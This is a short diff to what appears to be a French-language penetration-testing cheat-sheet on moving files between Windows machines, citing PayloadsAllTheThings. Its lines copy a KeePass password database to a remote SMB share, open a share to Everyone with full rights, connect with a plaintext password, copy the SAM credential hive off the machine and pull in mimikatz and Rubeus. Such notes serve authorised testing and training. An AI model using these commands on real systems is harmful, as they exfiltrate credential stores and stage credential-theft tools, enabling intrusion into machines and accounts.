@@ -15,6 +15,14 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     copy Passwords.kdbx \\192.168.50.100\smb\
     copy \\192.168.50.100\smb\Rubeus.exe .\Rubeus.exe
 
+**Partage interne entre deux machines Windows**
+
+    net share Partage=C:\Users\Tim /GRANT:Everyone,FULL
+    ...
+    net use * \\10.10.100.100\Partage /user:Tim Mdp123
+    copy C:\Windows.old\Windows\System32\SAM Z:\SAM
+    copy Z:\mimikatz.exe .\mimikatz.exe
+
 **Web (Apache)**
 
     sudo systemctl start apache2
